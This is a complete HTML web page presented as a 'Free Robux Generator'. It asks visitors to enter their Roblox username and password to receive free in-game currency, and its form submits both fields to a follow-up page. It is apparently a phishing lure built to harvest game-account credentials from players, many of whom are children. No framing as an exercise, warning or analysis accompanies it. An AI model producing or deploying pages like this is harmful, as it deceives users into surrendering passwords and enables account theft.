<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Robux Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #1abc9c, #3498db);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 6px 15px rgba(0,0,0,0.2);
      width: 320px;
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 10px;
      color: #2c3e50;
    }
    .login-box p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }
    .login-box label {
      display: block;
      text-align: left;
      margin-bottom: 5px;
      font-size: 14px;
      color: #333;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background: #27ae60;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #219150;
    }
    .login-box small {
      display: block;
      margin-top: -10px;
      margin-bottom: 15px;
      color: #888;
      font-size: 12px;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Free Robux Generator</h2>
    <p>Enter your Roblox username and password to receive Robux</p>
    <form action="welcome.html" method="get">
      <label for="username">Roblox Username</label>
      <input type="text" id="username" name="username" required>

      <label for="password">Roblox Password</label>
      <input type="password" id="password" name="password" required>
      <small>Password must be at least 6 characters</small>

      <button type="submit">Generate Robux</button>
    </form>
  </div>
</body>
</html>
